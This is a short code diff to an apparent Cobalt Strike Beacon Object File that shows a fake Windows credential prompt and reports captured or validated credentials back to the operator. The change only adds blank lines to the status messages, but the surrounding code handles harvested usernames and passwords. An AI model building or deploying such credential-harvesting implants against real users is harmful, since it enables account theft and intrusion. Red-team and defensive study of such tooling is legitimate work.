@@ -410,27 +410,27 @@ void run(const char* data, int len, HANDLE stop_event) {
         BeaconPrintf(
             CALLBACK_OUTPUT,
             result == PromptResult::validated
-                ? "\n[+] Credential validated\n"
-                : "\n[+] Credential captured without validation\n");
+                ? "\n\n[+] Credential validated\n"
+                : "\n\n[+] Credential captured without validation\n");
         print_credentials(credentials);
         wakeup();
     } else if (result == PromptResult::stopped) {
-        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Credential prompt stopped by operator\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "\n\n[*] Credential prompt stopped by operator\n");
     } else if (result == PromptResult::cancelled) {
-        BeaconPrintf(CALLBACK_OUTPUT, "\n[-] Credential prompt cancelled\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "\n\n[-] Credential prompt cancelled\n");
     } else if (result == PromptResult::timed_out) {
-        BeaconPrintf(CALLBACK_OUTPUT, "\n[-] Credential prompt timed out\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "\n\n[-] Credential prompt timed out\n");
     } else if (result == PromptResult::attempts_exhausted) {
         BeaconPrintf(
             CALLBACK_OUTPUT,
-            "\n[-] Credential validation failed after %u attempt(s) (error=%u)\n",
+            "\n\n[-] Credential validation failed after %u attempt(s) (error=%u)\n",
             settings.max_attempts,
             error_code);
         if (credentials.username[0] != L'\0') {
             print_credentials(credentials);
         }
     } else {
-        BeaconPrintf(CALLBACK_ERROR, "\n[-] Credential prompt failed (error=%u)\n", error_code);
+        BeaconPrintf(CALLBACK_ERROR, "\n\n[-] Credential prompt failed (error=%u)\n", error_code);
     }
 
     secure_zero(generated_message, sizeof(generated_message));
